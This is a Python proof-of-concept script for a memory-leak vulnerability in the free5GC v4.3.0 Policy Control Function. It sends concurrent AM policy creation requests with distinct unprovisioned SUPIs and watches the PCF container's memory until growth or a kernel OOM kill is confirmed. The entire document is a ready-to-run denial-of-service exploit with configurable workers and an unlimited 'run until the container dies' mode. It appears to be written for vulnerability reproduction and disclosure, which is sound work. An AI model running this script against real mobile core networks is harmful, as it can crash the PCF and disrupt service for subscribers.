#!/usr/bin/env python3
"""free5GC PCF UePool memory-leak PoC (VUL-20261006).

PostPoliciesProcedure() (free5GC v4.3.0, NFs/pcf/internal/sbi/processor/ampolicy.go:197-240)
permanently stores every newly created UeContext in the process-global pcfSelf.UePool but
calls UePool.Delete only on the no-UDR path; when a UDR is reachable and
GetAccessAndMobilityPolicyData fails (unprovisioned SUPI -> UDR 404) the handler returns
without cleanup, so each POST /npcf-am-policy-control/v1/policies carrying a DISTINCT
unprovisioned SUPI retains ~1.3 kB for the lifetime of the process. The PoC fires
concurrent creates with fresh SUPIs while sampling the PCF's VmRSS: memory climbs
monotonically with no plateau, and on a capped container (docker update --memory 1g
--memory-swap 1g pcf, then restart) the kernel OOM-kills the process (exit 137).

Usage (full free5GC v4.3.0 core running, PCF reachable at 10.100.200.7:8000):
    python3 poc.py --target 10.100.200.7:8000 --pcf-container pcf                  # leak
    python3 poc.py --target 10.100.200.7:8000 --pcf-container pcf --max-requests 0 # run to OOM
Exit code 0 = problem reproduced (unbounded growth or OOM kill); 2 = not reproduced.
"""
import argparse
import itertools
import subprocess
import sys
import threading
import time

import httpx


def container_running(container: str) -> bool:
    r = subprocess.run(["docker", "inspect", "-f", "{{.State.Status}}", container],
                       capture_output=True, text=True, timeout=8)
    return r.stdout.strip() == "running"


def container_state(container: str) -> str:
    r = subprocess.run(["docker", "inspect", "-f",
                        "status={{.State.Status}} exit={{.State.ExitCode}} "
                        "oom={{.State.OOMKilled}} finished={{.State.FinishedAt}}", container],
                       capture_output=True, text=True, timeout=8)
    return r.stdout.strip()


def rss_kib(container: str) -> int:
    """Go-process RSS (kB) read from inside the container; -1 when unavailable."""
    try:
        out = subprocess.run(["docker", "exec", container, "cat", "/proc/1/status"],
                             capture_output=True, text=True, timeout=5).stdout
        for line in out.splitlines():
            if line.startswith("VmRSS:"):
                return int(line.split()[1])
    except Exception:  # noqa: BLE001
        pass
    return -1


def main():
    ap = argparse.ArgumentParser(description="free5GC PCF UePool leak (VUL-20261006) PoC")
    ap.add_argument("--target", default="10.100.200.7:8000", help="PCF SBI host:port")
    ap.add_argument("--pcf-container", default="pcf", help="PCF container name for RSS sampling")
    ap.add_argument("--workers", type=int, default=16, help="concurrent request workers")
    ap.add_argument("--max-requests", type=int, default=10000,
                    help="stop after this many creates (0 = run until the container dies)")
    ap.add_argument("--max-minutes", type=int, default=180, help="runtime safety cap")
    ap.add_argument("--sample-every", type=int, default=5, help="seconds between RSS samples")
    ap.add_argument("--min-growth-kib", type=int, default=5000,
                    help="net RSS growth (kB) that counts as the leak reproduced without an OOM kill")
    ap.add_argument("--supi-start", type=int, default=208931000000000,
                    help="SUPIs are imsi-<base+1>...; keep the base outside the provisioned range")
    args = ap.parse_args()
    if not args.target or args.target.startswith(":"):
        ap.error("--target needs a host: resolve it first, e.g. PCF_IP=$(docker inspect -f "
                 "'{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' pcf)")

    url = f"http://{args.target}/npcf-am-policy-control/v1/policies"
    body = ('{"supi":"imsi-%d","notificationUri":"http://10.100.240.1:9999/namf-callback/v1/f5v-f2",'
            '"servingPlmn":{"mcc":"208","mnc":"93"},"suppFeat":"0"}')

    counter = itertools.count(1)
    sent = hits = send_failures = 0
    lock = threading.Lock()
    stop_flag = threading.Event()

    def worker():
        nonlocal sent, hits, send_failures
        fails = 0
        with httpx.Client(timeout=10.0,
                          limits=httpx.Limits(max_keepalive_connections=2, max_connections=2)) as c:
            while not stop_flag.is_set():
                i = next(counter)
                try:
                    r = c.post(url, content=(body % (args.supi_start + i)).encode(),
                               headers={"Content-Type": "application/json"})
                    fails = 0
                    if "Get Access And Mobility Policy Data" in r.text:
                        with lock:
                            hits += 1
                except Exception:  # noqa: BLE001
                    fails += 1
                    if fails >= 30:  # unreachable target: abort loudly instead of spinning
                        with lock:
                            send_failures += 1
                        stop_flag.set()
                        return
                    if not container_running(args.pcf_container):
                        stop_flag.set()
                        return
                with lock:
                    sent += 1

    t0 = time.time()
    samples = []
    for _ in range(args.workers):
        threading.Thread(target=worker, daemon=True).start()
    print(f"[poc] workers={args.workers} target={url} "
          f"max_requests={args.max_requests or 'unlimited'}", flush=True)
    while not stop_flag.is_set():
        time.sleep(args.sample_every)
        with lock:
            n = sent
        rss = rss_kib(args.pcf_container)
        el = round(time.time() - t0, 1)
        samples.append((el, n, rss))
        print(f"[poc] t={el:>8}s sent={n:>8} vmrss_kB={rss:>8}", flush=True)
        if (args.max_requests and n >= args.max_requests) or el >= args.max_minutes * 60:
            stop_flag.set()
        if not container_running(args.pcf_container):
            stop_flag.set()
            print("[poc] CONTAINER NO LONGER RUNNING — OOM expected", flush=True)
    time.sleep(2)
    with lock:
        n, h = sent, hits
    state = container_state(args.pcf_container)
    vals = [s[2] for s in samples if s[2] > 0]
    growth = vals[-1] - vals[0] if len(vals) >= 2 else 0
    per_req = growth * 1024.0 / n if n else 0.0

    print("-" * 72)
    print(f"[poc] sent={n} elapsed={round(time.time() - t0, 1)}s leak_path_hits={h}/{n}")
    if send_failures:
        print(f"[poc] {send_failures} worker(s) aborted on repeated connection failures — "
              f"is the target {url} reachable?")
    if vals:
        print(f"[poc] vmrss {vals[0]} -> {vals[-1]} kB  net_growth=+{growth} kB  "
              f"per_request={per_req:.0f} B")
    print(f"[poc] container state: {state}")
    killed = "oom=true" in state
    if killed:
        verdict = "OOM KILL REPRODUCED — the kernel terminated the leak-bloated PCF"
    elif growth >= args.min_growth_kib:
        verdict = "LEAK REPRODUCED — RSS grows without cleanup (cap the container to see the OOM kill)"
    else:
        verdict = "NOT_REPRODUCED"
    print(f"[poc] VERDICT: {verdict}")
    print("-" * 72)
    return 0 if killed or growth >= args.min_growth_kib else 2


if __name__ == "__main__":
    sys.exit(main())
